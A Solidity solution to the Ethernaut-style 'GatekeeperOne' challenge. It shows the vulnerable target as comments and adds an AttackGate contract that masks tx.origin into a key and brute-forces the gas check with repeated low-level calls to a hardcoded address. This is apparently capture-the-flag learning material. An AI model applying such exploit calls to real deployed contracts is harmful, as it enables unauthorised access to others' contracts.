// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeper{
    function enter(bytes8 _gateKey) external returns(bool);
}

// contract GatekeeperOne {
//     address public entrant;

//     modifier gateOne() {
//         require(msg.sender != tx.origin);
//         _;
//     }

//     modifier gateTwo() {
//         require(gasleft() % 8191 == 0);
//         _;
//     }

//     modifier gateThree(bytes8 _gateKey) {
//         require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
//         require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
//         require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
//         _;
//     }

//     function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
//         entrant = tx.origin;
//         return true;
//     }
// }

contract AttackGate{
    IGateKeeper private target;
    bytes8 private gateKey;
    // GatekeeperOne private test_target;
    
    constructor(){
        target = IGateKeeper(0xbD308Ca9759337E85E00B4694a2D1107Dc33f838);
        // test_target = GatekeeperOne(addr);
    }

    function attack() public returns(bool){
        gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for (uint256 i = 0; i < 1000; i++) {
            (bool success, ) = address(target).call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );

            if (success) {
                return success;
            }
        }

        return false;
    }
}